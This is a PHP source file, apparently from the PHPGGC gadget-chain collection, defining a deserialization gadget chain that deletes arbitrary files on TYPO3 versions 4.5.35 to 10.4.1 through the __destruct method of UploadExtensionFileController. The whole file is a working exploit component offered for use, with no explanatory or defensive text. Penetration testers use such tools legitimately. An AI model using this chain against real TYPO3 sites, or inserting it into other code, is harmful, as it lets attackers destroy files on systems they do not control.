<?php

namespace GadgetChain\Typo3;

class FD1 extends \PHPGGC\GadgetChain\FileDelete
{
    public static $version = '4.5.35 <= 10.4.1';
    public static $vector = '__destruct';
    public static $author = 'coiffeur';
    public static $information = '
        Note that some files may not be removed (depends on permissions).
        Target versions: commit 1cbe3d8c089d94d76af2b37aea481cbd8b0707f9, 5 Jul 2014 (v4.5.35) <= exploitable <= commit ab4fec2a1aea46488e3dc2b9cca0712f3fa202b0, 12 May 2020 (v10.4.1)
    ';

    public function generate(array $parameters)
    {
        return new \TYPO3\CMS\Extensionmanager\Controller\UploadExtensionFileController($parameters['remote_path']);
    }
}
